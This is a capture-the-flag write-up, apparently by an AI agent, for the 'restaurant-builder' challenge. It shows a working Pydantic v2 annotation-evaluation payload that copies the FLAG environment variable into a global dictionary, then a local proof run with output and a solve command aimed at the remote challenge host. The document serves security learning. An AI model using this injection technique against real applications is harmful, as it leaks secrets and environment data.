# restaurant-builder write-up

## Summary

The application lets users create Pydantic models dynamically:

```python
description = {k: v for k,v in description.items() if not k.startswith("__")}
Blueprint = create_model(name, **description)
```

The keys are filtered, but the values are not. In Pydantic v2, a field value that is a string is treated as an annotation / forward reference and is evaluated in the caller frame when the model is built or rebuilt. Because `register_blueprint()` has access to the module globals, the annotation string can reference `items` and `os.environ`.

Payload:

```python
(items.__setitem__('flag_<random>', __import__('os').environ.get('FLAG', 'NO_FLAG_IN_ENV')) or str)
```

This stores the flag in the global `items` dictionary and returns `str`, so model creation still succeeds. The flag can then be retrieved with:

```http
GET /item/flag_<random>
```

## Local proof

Command:

```bash
cd /mnt/data/restaurant_builder_work/src/restaurant-builder/src
FLAG='GPNCTF{local_dummy_flag_for_restaurant_builder}' \
  python3 -m uvicorn main:app --host 127.0.0.1 --port 31337
python3 /mnt/data/restaurant_builder_work/solve_restaurant_builder.py http://127.0.0.1:31337
```

Observed output:

```text
[+] POST /blueprint/bp_04e8a366e6 status=200 body="Blueprint successfully registered"
[+] GET  /item/flag_04e8a366e6 status=200 body="GPNCTF{local_dummy_flag_for_restaurant_builder}"
[+] extracted=GPNCTF{local_dummy_flag_for_restaurant_builder}
```

## Remote status

The same exploit script is ready for the remote target:

```bash
python3 solve_restaurant_builder.py \
  https://poached-potato-atop-whipped-black-garlic-pccm.gpn24.ctf.kitctf.de
```

In this sandbox, direct outbound DNS / HTTPS from the execution container failed with:

```text
urllib.error.URLError: <urlopen error [Errno -3] Temporary failure in name resolution>
```

A GET through the browsing backend confirmed that the remote service root is live and returns the expected restaurant safety message, but the available browsing backend cannot issue the required POST request.
